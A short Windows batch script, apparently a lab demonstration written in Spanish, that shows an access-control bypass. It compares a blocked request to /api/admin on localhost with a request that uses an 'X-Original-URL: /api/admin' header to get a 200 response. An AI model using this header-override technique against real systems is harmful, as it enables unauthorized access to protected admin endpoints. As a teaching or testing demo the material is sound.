@echo off
REM Demostración Visual de Bypass 403
echo ================================================================
echo DEMOSTRACION VISUAL: Bypass 403 con X-Original-URL
echo ================================================================
echo.

echo [PASO 1] Acceso NORMAL a /api/admin (deberia fallar)
echo ---------------------------------------------------------------
echo Ejecutando: curl http://localhost:8080/api/admin
echo.
curl -i http://localhost:8080/api/admin 2>nul
echo.
echo ===============================================================
echo.
timeout /t 3 /nobreak >nul

echo.
echo [PASO 2] Acceso con BYPASS usando X-Original-URL header
echo ---------------------------------------------------------------
echo Ejecutando: curl -H "X-Original-URL: /api/admin" http://localhost:8080/
echo.
curl -i -H "X-Original-URL: /api/admin" http://localhost:8080/ 2>nul
echo.
echo ===============================================================
echo.

echo COMPARACION:
echo - Paso 1: Debiste ver un error 401/403 o redireccion
echo - Paso 2: Debiste ver un codigo 200 OK con contenido!
echo.
echo Esto demuestra que el header X-Original-URL bypasea la seguridad.
echo.
pause
